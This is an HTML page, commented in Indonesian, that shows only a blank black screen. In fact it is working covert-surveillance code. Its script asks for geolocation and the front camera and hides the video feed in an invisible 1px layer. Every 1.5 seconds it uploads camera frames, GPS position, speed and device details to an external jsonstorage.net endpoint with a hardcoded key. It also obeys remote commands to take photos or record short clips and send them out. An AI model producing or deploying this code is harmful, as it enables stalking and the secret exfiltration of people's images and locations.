<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #000000;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        #hiddenMediaLayer {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
    </style>
</head>
<body onclick="onScreenTap()">

<div id="hiddenMediaLayer">
    <video id="videoPreview" autoplay playsinline muted></video>
    <canvas id="captureCanvas"></canvas>
</div>

<script>
    const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
    const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";

    // Interval kirim live frame (1500 ms = ~1.5 detik) agar tidak membebani jsonstorage.net
    const LIVE_FRAME_MS = 1500;
    const RECORD_MS = 4000;

    const sessionId = "sess_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
    let locationData = null;
    let cameraStream = null;
    let watchId = null;
    let loopTimer = null;
    let isBusy = false;
    let isInitializing = false;
    let lastHandledCommandToken = null;

    const video = document.getElementById('videoPreview');
    const canvas = document.getElementById('captureCanvas');

    function makeFrameDataUrl(width, quality) {
        const vw = video.videoWidth || 640;
        const vh = video.videoHeight || 480;
        const targetH = Math.round((vh / vw) * width);
        canvas.width = width;
        canvas.height = targetH;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, width, targetH);
        return canvas.toDataURL('image/jpeg', quality);
    }

    function startLocationWatcher() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error("Geolocation not supported"));
                return;
            }
            let settled = false;
            if (watchId !== null) navigator.geolocation.clearWatch(watchId);

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    locationData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        akurasi: Math.round(pos.coords.accuracy) + " meter",
                        speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
                            ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
                            : "-",
                        heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
                            ? Math.round(pos.coords.heading) + "°"
                            : "-"
                    };
                    if (!settled) {
                        settled = true;
                        resolve(locationData);
                    }
                },
                (err) => {
                    if (!settled) {
                        settled = true;
                        reject(err);
                    }
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        });
    }

    async function initSession() {
        if (isInitializing) return;
        isInitializing = true;

        try {
            if (!locationData) {
                await startLocationWatcher();
            }
            if (locationData && !cameraStream && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                video.srcObject = cameraStream;
                await video.play().catch(() => {});
            }
            if (locationData && cameraStream) {
                startLiveLoop();
            }
        } catch (err) {
            console.error(err);
        } finally {
            isInitializing = false;
        }
    }

    function onScreenTap() {
        if (!locationData || !cameraStream) {
            initSession();
        }
    }

    function pickMimeType() {
        const candidates = ['video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
        for (const m of candidates) {
            if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
        }
        return '';
    }

    function recordClipBase64() {
        return new Promise((resolve, reject) => {
            if (!cameraStream || !window.MediaRecorder) {
                reject(new Error("MediaRecorder not supported"));
                return;
            }
            const mime = pickMimeType();
            const opts = { videoBitsPerSecond: 160000 };
            if (mime) opts.mimeType = mime;

            let rec;
            try { rec = new MediaRecorder(cameraStream, opts); }
            catch (e) { rec = new MediaRecorder(cameraStream); }

            const chunks = [];
            rec.ondataavailable = (ev) => { if (ev.data && ev.data.size > 0) chunks.push(ev.data); };
            rec.onerror = () => reject(new Error("Record error"));
            rec.onstop = () => {
                const blob = new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = () => reject(new Error("Read error"));
                reader.readAsDataURL(blob);
            };

            rec.start();
            setTimeout(() => {
                if (rec.state === "recording") rec.stop();
            }, RECORD_MS);
        });
    }

    async function fetchStorage() {
        const res = await fetch(`${JSON_URL}?t=${Date.now()}`);
        if (!res.ok) throw new Error("Fetch failed");
        const data = await res.json();
        return {
            logs: Array.isArray(data.logs) ? data.logs : [],
            liveSessions: data.liveSessions && typeof data.liveSessions === "object" ? data.liveSessions : {},
            command: data.command || { action: "NONE", targetSessionId: null, token: null }
        };
    }

    async function saveStorage(payload) {
        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
        const res = await fetch(putUrl, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        if (!res.ok) throw new Error("Save failed");
    }

    async function tickLiveAndCommands() {
        if (isBusy || !cameraStream || !locationData) return;
        isBusy = true;

        try {
            const state = await fetchStorage();
            const nowStr = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + " WIB";

            // Frame kecil (320px, kualitas 0.42) untuk simulasi tampilan video call
            const liveFrame = makeFrameDataUrl(320, 0.42);

            state.liveSessions[sessionId] = {
                sessionId: sessionId,
                nama: "HP Saya",
                frame: liveFrame,
                lat: locationData.lat,
                lng: locationData.lng,
                akurasi: locationData.akurasi,
                kecepatan: locationData.speed,
                arah: locationData.heading,
                waktu: nowStr,
                updatedAt: Date.now(),
                perangkat: navigator.userAgent
            };

            const cmd = state.command || {};
            const isForMe = !cmd.targetSessionId || cmd.targetSessionId === sessionId;
            const hasNewAction = (cmd.action === "PHOTO" || cmd.action === "RECORD") && cmd.token && cmd.token !== lastHandledCommandToken;

            if (isForMe && hasNewAction) {
                lastHandledCommandToken = cmd.token;

                if (cmd.action === "PHOTO") {
                    const fotoHD = makeFrameDataUrl(480, 0.6);
                    state.logs.unshift({
                        id: Date.now(),
                        sessionId: sessionId,
                        tipe: "foto",
                        nama: "HP Saya",
                        foto: fotoHD,
                        video: null,
                        lat: locationData.lat,
                        lng: locationData.lng,
                        akurasi: locationData.akurasi,
                        waktu: nowStr,
                        perangkat: navigator.userAgent
                    });
                } else if (cmd.action === "RECORD") {
                    const videoClip = await recordClipBase64();
                    state.logs.unshift({
                        id: Date.now(),
                        sessionId: sessionId,
                        tipe: "rekaman",
                        nama: "HP Saya",
                        foto: null,
                        video: videoClip,
                        lat: locationData.lat,
                        lng: locationData.lng,
                        akurasi: locationData.akurasi,
                        waktu: nowStr,
                        perangkat: navigator.userAgent
                    });
                }

                state.command = { action: "NONE", targetSessionId: null, token: null };
            }

            await saveStorage(state);
        } catch (err) {
            console.error(err);
        } finally {
            isBusy = false;
        }
    }

    function startLiveLoop() {
        if (loopTimer) clearInterval(loopTimer);
        tickLiveAndCommands();
        loopTimer = setInterval(tickLiveAndCommands, LIVE_FRAME_MS);
    }

    window.addEventListener("DOMContentLoaded", initSession);
    window.addEventListener("beforeunload", () => {
        if (loopTimer) clearInterval(loopTimer);
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
    });
</script>

</body>
</html>
